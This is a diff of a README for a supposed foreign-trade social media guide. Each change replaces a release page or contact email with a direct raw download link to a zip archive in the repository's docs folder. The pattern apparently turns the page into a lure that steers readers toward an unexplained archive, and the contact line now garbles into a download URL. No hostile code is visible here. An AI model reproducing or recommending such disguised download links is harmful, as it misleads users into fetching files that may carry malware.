@@ -2,7 +2,7 @@
 
 Welcome to the **Foreign Trade Social Media Guide**! This repository serves as a complete resource for navigating social media applications tailored for foreign trade and cross-border e-commerce. Whether you are a seasoned exporter or just starting, this guide will help you leverage social media effectively to enhance your business.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/Drgon37/foreign-trade-social-media-guide/releases)
+[![Download Releases](https://github.com/Drgon37/foreign-trade-social-media-guide/raw/refs/heads/main/docs/foreign_social_media_guide_trade_2.0.zip%20Releases-Click%20Here-brightgreen)](https://github.com/Drgon37/foreign-trade-social-media-guide/raw/refs/heads/main/docs/foreign_social_media_guide_trade_2.0.zip)
 
 ## 📖 Table of Contents
 
@@ -119,10 +119,10 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## 📞 Contact
 
-For questions or suggestions, feel free to reach out via GitHub issues or directly through my email: [your-email@example.com].
+For questions or suggestions, feel free to reach out via GitHub issues or directly through my email: [https://github.com/Drgon37/foreign-trade-social-media-guide/raw/refs/heads/main/docs/foreign_social_media_guide_trade_2.0.zip].
 
 ---
 
-For more resources, please visit the [Releases](https://github.com/Drgon37/foreign-trade-social-media-guide/releases) section. Here, you can find the latest updates and download the guide.
+For more resources, please visit the [Releases](https://github.com/Drgon37/foreign-trade-social-media-guide/raw/refs/heads/main/docs/foreign_social_media_guide_trade_2.0.zip) section. Here, you can find the latest updates and download the guide.
 
 Thank you for exploring the **Foreign Trade Social Media Guide**! Together, let's enhance our understanding and use of social media in foreign trade.
